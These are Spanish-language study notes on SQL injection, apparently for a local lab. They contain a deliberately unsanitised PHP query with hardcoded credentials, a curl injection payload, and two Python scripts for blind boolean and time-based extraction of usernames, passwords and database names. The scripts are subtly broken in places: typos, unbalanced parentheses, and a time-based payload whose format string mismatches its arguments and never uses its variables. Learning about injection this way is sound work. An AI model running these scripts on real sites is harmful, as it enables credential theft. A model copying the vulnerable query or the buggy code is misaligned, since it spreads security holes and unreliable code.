1. [[SQLI]]
	query desde php a la db para mostrar el nombre del usuario por su id(no sanitizada)
	```php
	<?php
  $server = "localhost";
  $username = "luka";
  $password = "123456";
  $database = "basededatos";

  $conn = new msqli($server, $username, $password, $database);

  $id = $_GET['id'];

  $data = mysqli_query($conn, "select username from users where id = '$id'");
  $response = mysqli_fetch_array($data);

  echo $response["username"];
?>
	```
	usando la clausula **ORDER BY *3*** se puede averiguar el nro de columnas en la tabla
	-- - para comentar el resto de la query

	ejemplo inyeccion booleana:
	```sql
	select(select substring(username,1,1) from user where id='1')='a'
	```
	pero esta query podria dar problemas por las comillas, entonces se recomienda usar ASCII
	```sql
	select(select ascii(substring(username,1,1)) from user where id='1')=97;
	```

	comando curl con parametro de url data
	```bash
	curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlenconde "id=2 or '1'='1'"
	```
	
	```python
	#!/usr/bin/python3

import requests
import signal
import sys
import time
import string

from pwn import *

def def_handler(sig, frame):
    print("\n\n [!] exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# global_vars

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
    p1 = log.progress("brute force")
    p1.status("inicializing brute force")
    
    time.sleep(1)

    p2 = log.progress("extracted data")

    extracted_info = ""
            
    for position in range(1,50):
        for character in range(33, 126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring(select group_concat(username, 0x3a, password) from users),%d,1)) from user where id='1')=%d)" % (position, character);
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
    sys.exit(0)


if __name__ == "__main__":
    makeSQLI()
	```
**`characters`**: Una lista de todos los caracteres imprimibles que se usarán para comparar con los datos de la base de datos.
##### Lógica Principal: El ataque de Fuerza Bruta

La función `makeSQLI()` es el corazón del script. Utiliza dos bucles anidados para extraer la información.
El script intenta "adivinar" el contenido de la tabla `users` mediante esta estructura de URL: `?id=9 or (select(select ascii(substring(..., posicion, 1)) ...)=caracter)`
##### Los Bucles:
1. **Bucle Externo (`for position in range(1,50)`)**: Itera sobre cada posición de la cadena de texto que queremos extraer (del primer carácter al 50).
2. **Bucle Interno (`for character in range(33, 126)`)**: Prueba los valores ASCII del 33 al 126 (letras, números y símbolos).
##### La Condición Booleana:
- El script envía una petición GET.
- **Si la condición es verdadera**: El servidor responde con un código `200 OK`, lo que significa que el carácter probado es el correcto.
- **Acción**: El script guarda ese carácter en `extracted_info`, lo imprime en pantalla y pasa a la siguiente posición (`break`).


```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string

from pwn import *

def def_handler(sig, frame):
    print("\n\n [!] exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# global_vars

main_url = "http://localhost/searchUsers.php"
characters = string.printable
sleep_time = 0.35


def makeSQLI():
    p1 = log.progress("brute force")
    p1.status("inicializing brute force")
    
    time.sleep(1)

    p2 = log.progress("extracted data")

    extracted_info = ""
            
    for position in range(1,50):
        for character in range(33, 126):
            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=72, sleep(sleep_time),1)" % (position, character);


            p1.status(sqli_url)

            time_start = time.time()

            r = requests.get(sqli_url)

            time_end = time.time()

            if time_end - time_start >sleep_time:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
    sys.exit(0)


if __name__ == "__main__":
    makeSQLI()
```
- **`time.time()`**: El script toma una marca de tiempo antes y después de la petición HTTP.
- **`if(condition, sleep, 1)`**: Esta es la función condicional de SQL. Si la condición se cumple, se ejecuta el `sleep`.
- **`time_end - time_start > sleep_time`**: Si la respuesta tardó más que el tiempo de espera configurado, el script confirma que el carácter es correcto.

